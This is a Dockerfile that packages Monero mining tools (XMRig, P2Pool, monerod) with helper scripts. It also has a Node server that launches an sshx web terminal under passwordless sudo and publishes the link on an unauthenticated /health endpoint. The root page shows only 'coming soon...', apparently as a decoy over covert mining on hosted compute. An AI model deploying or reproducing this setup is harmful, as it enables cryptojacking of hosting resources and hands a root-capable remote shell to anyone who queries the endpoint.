FROM ubuntu:22.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV NODE_VERSION=20.x

# Install dependencies + sudo + mining tools
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    gnupg \
    sudo \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    libzmq3-dev \
    libsodium-dev \
    libpgm-dev \
    libnorm-dev \
    libgss-dev \
    libcurl4-openssl-dev \
    pkg-config \
    tar \
    jq \
    screen \
    && rm -rf /var/lib/apt/lists/*

# Install Node.js
RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION} | bash - \
    && apt-get install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

# Install sshx (as root → goes into /usr/local/bin)
RUN curl -sSf https://sshx.io/get | sh

# Create non-root user + give it passwordless sudo
RUN useradd -m -s /bin/bash appuser \
    && echo "appuser ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/appuser \
    && chmod 0440 /etc/sudoers.d/appuser

# Create app directory & set ownership
WORKDIR /app
RUN chown appuser:appuser /app

# Switch to appuser for installations
USER appuser

# Download and install XMRig (CPU miner)
RUN cd /home/appuser && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz && \
    tar -xzf xmrig-6.21.3-linux-x64.tar.gz && \
    mv xmrig-6.21.3 xmrig && \
    rm xmrig-6.21.3-linux-x64.tar.gz

# Download and install P2Pool
RUN cd /home/appuser && \
    wget https://github.com/SChernykh/p2pool/releases/download/v4.1/p2pool-v4.1-linux-x64.tar.gz && \
    tar -xzf p2pool-v4.1-linux-x64.tar.gz && \
    mv p2pool-v4.1-linux-x64 p2pool && \
    rm p2pool-v4.1-linux-x64.tar.gz

# Download Monero CLI
RUN cd /home/appuser && \
    wget https://downloads.getmonero.org/cli/monero-linux-x64-v0.18.3.4.tar.bz2 && \
    tar -xjf monero-linux-x64-v0.18.3.4.tar.bz2 && \
    mv monero-x86_64-linux-gnu-v0.18.3.4 monero && \
    rm monero-linux-x64-v0.18.3.4.tar.bz2

# Create mining helper script
RUN cat > /home/appuser/start-mining.sh << 'MINING_SCRIPT'
#!/bin/bash

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Monero P2Pool Mining Setup          ║${NC}"
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo ""

# Check if wallet address is provided
if [ -z "$1" ]; then
    echo -e "${RED}Error: Wallet address required!${NC}"
    echo ""
    echo -e "${YELLOW}Usage:${NC}"
    echo "  ./start-mining.sh YOUR_MONERO_WALLET_ADDRESS"
    echo ""
    echo -e "${YELLOW}Example:${NC}"
    echo "  ./start-mining.sh 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
    echo ""
    exit 1
fi

WALLET_ADDRESS=$1

echo -e "${GREEN}Wallet Address:${NC} $WALLET_ADDRESS"
echo ""

# Kill any existing mining processes
echo -e "${YELLOW}Stopping any existing mining processes...${NC}"
pkill -9 monerod 2>/dev/null
pkill -9 p2pool 2>/dev/null
pkill -9 xmrig 2>/dev/null
sleep 2

# Create directories
mkdir -p /home/appuser/.bitmonero
mkdir -p /home/appuser/p2pool-data

echo -e "${GREEN}Starting Monero Node...${NC}"
# Start Monero node in screen session
screen -dmS monerod bash -c "cd /home/appuser/monero && ./monerod --zmq-pub tcp://127.0.0.1:18083 --out-peers 16 --in-peers 32 --add-priority-node=p2pmd.xmrvsbeast.com:18080 --add-priority-node=nodes.hashvault.pro:18080 --disable-dns-checkpoints --enable-dns-blocklist"

echo -e "${YELLOW}Waiting for Monero node to initialize (60 seconds)...${NC}"
sleep 60

echo -e "${GREEN}Starting P2Pool...${NC}"
# Start P2Pool in screen session
screen -dmS p2pool bash -c "cd /home/appuser/p2pool && ./p2pool --host 127.0.0.1 --wallet $WALLET_ADDRESS --mini"

echo -e "${YELLOW}Waiting for P2Pool to initialize (30 seconds)...${NC}"
sleep 30

echo -e "${GREEN}Starting XMRig miner...${NC}"
# Start XMRig in screen session
screen -dmS xmrig bash -c "cd /home/appuser/xmrig && ./xmrig -o 127.0.0.1:3333 -u $WALLET_ADDRESS --tls --coin monero"

echo ""
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Mining Started Successfully!         ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Useful Commands:${NC}"
echo "  screen -r monerod   # Attach to Monero node"
echo "  screen -r p2pool    # Attach to P2Pool"
echo "  screen -r xmrig     # Attach to XMRig miner"
echo "  screen -ls          # List all sessions"
echo "  Ctrl+A then D       # Detach from screen"
echo ""
echo -e "${YELLOW}Stop Mining:${NC}"
echo "  ./stop-mining.sh"
echo ""
echo -e "${YELLOW}Check Status:${NC}"
echo "  ./mining-status.sh"
echo ""

MINING_SCRIPT

# Create stop mining script
RUN cat > /home/appuser/stop-mining.sh << 'STOP_SCRIPT'
#!/bin/bash

GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}Stopping all mining processes...${NC}"

pkill -9 monerod
pkill -9 p2pool
pkill -9 xmrig

screen -S monerod -X quit 2>/dev/null
screen -S p2pool -X quit 2>/dev/null
screen -S xmrig -X quit 2>/dev/null

echo -e "${GREEN}Mining stopped!${NC}"

STOP_SCRIPT

# Create mining status script
RUN cat > /home/appuser/mining-status.sh << 'STATUS_SCRIPT'
#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   Mining Status Check                  ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""

# Check Monero node
if pgrep -x "monerod" > /dev/null; then
    echo -e "${GREEN}✓ Monero Node:${NC} Running"
else
    echo -e "${RED}✗ Monero Node:${NC} Not Running"
fi

# Check P2Pool
if pgrep -x "p2pool" > /dev/null; then
    echo -e "${GREEN}✓ P2Pool:${NC} Running"
else
    echo -e "${RED}✗ P2Pool:${NC} Not Running"
fi

# Check XMRig
if pgrep -x "xmrig" > /dev/null; then
    echo -e "${GREEN}✓ XMRig Miner:${NC} Running"
else
    echo -e "${RED}✗ XMRig Miner:${NC} Not Running"
fi

echo ""
echo -e "${YELLOW}Screen Sessions:${NC}"
screen -ls

STATUS_SCRIPT

# Make scripts executable
RUN chmod +x /home/appuser/start-mining.sh \
    /home/appuser/stop-mining.sh \
    /home/appuser/mining-status.sh

# Create README
RUN cat > /home/appuser/MINING_README.txt << 'README'
╔═══════════════════════════════════════════════════════════╗
║           MONERO P2POOL MINING - QUICK START             ║
╚═══════════════════════════════════════════════════════════╝

STEP 1: Get your sshx terminal link from /health endpoint

STEP 2: Access the terminal via sshx link

STEP 3: Start mining with your wallet address:
   cd /home/appuser
   ./start-mining.sh YOUR_MONERO_WALLET_ADDRESS

EXAMPLE:
   ./start-mining.sh 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge

═══════════════════════════════════════════════════════════

INSTALLED TOOLS:
  ✓ Monero Node (monerod)     - Full blockchain sync
  ✓ P2Pool                    - Decentralized mining pool
  ✓ XMRig                     - CPU miner

HELPER SCRIPTS:
  ./start-mining.sh <wallet>  - Start mining
  ./stop-mining.sh            - Stop all mining
  ./mining-status.sh          - Check status

SCREEN SESSIONS:
  screen -r monerod           - View node logs
  screen -r p2pool            - View pool logs
  screen -r xmrig             - View miner logs
  screen -ls                  - List all sessions
  Ctrl+A then D               - Detach from screen

═══════════════════════════════════════════════════════════

LOCATIONS:
  Monero:  /home/appuser/monero/
  P2Pool:  /home/appuser/p2pool/
  XMRig:   /home/appuser/xmrig/

NEED A WALLET?
  Create one at: https://www.getmonero.org/downloads/

═══════════════════════════════════════════════════════════
README

# Switch back to root for server setup
USER root

# Create Node.js server
RUN cat > /app/server.js << 'EOF'
const http = require('http');
const { spawn } = require('child_process');

const PORT = process.env.PORT || 3000;
let sshxLink = 'initializing...';

// Execute sshx command and capture output
console.log('Starting sshx...');
const sshxProcess = spawn('sudo', ['sshx'], {
  stdio: ['ignore', 'pipe', 'pipe']
});

let stdoutData = '';
let stderrData = '';

sshxProcess.stdout.on('data', (data) => {
  const output = data.toString();
  stdoutData += output;
  console.log('SSHX stdout:', output);
  
  const linkMatch = output.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
  if (linkMatch) {
    sshxLink = linkMatch[0];
    console.log('SSHX Link captured:', sshxLink);
  }
});

sshxProcess.stderr.on('data', (data) => {
  const output = data.toString();
  stderrData += output;
  console.log('SSHX stderr:', output);
  
  const linkMatch = output.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
  if (linkMatch) {
    sshxLink = linkMatch[0];
    console.log('SSHX Link captured:', sshxLink);
  }
});

sshxProcess.on('error', (error) => {
  console.error('Failed to start sshx:', error);
  sshxLink = 'error: ' + error.message;
});

sshxProcess.on('close', (code) => {
  console.log(`sshx process exited with code ${code}`);
  if (sshxLink === 'initializing...') {
    sshxLink = 'link not found in output';
  }
});

// Create HTTP server
const server = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json');
  
  if (req.method === 'GET' && req.url === '/') {
    res.statusCode = 200;
    res.end(JSON.stringify({ 
      message: 'coming soon...'
    }));
  } else if (req.method === 'GET' && req.url === '/health') {
    res.statusCode = 200;
    res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: sshxLink,
      message: 'Access the terminal via the sshx link above',
      quickstart: 'Run: ./start-mining.sh YOUR_WALLET_ADDRESS'
    }));
  } else if (req.method === 'GET' && req.url === '/instructions') {
    res.statusCode = 200;
    res.end(JSON.stringify({
      step1: 'Get sshx link from /health endpoint',
      step2: 'Open the sshx link in your browser',
      step3: 'Login as: appuser (already logged in)',
      step4: 'Run: cd /home/appuser',
      step5: 'Run: ./start-mining.sh YOUR_MONERO_WALLET_ADDRESS',
      example: './start-mining.sh 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge',
      note: 'Replace with your actual Monero wallet address'
    }));
  } else {
    res.statusCode = 404;
    res.end(JSON.stringify({ error: 'Not Found' }));
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`
╔════════════════════════════════════════╗
║   Monero Mining Server Started         ║
╚════════════════════════════════════════╝

Visit /health to get your sshx terminal link
Then access terminal and run:
  cd /home/appuser
  ./start-mining.sh YOUR_WALLET_ADDRESS

  `);
});
EOF

# Give the file to the non-root user
RUN chown appuser:appuser /app/server.js

# Switch to non-root user
USER appuser

# Expose port
EXPOSE 3000

# Start the application as non-root user
CMD ["node", "server.js"]
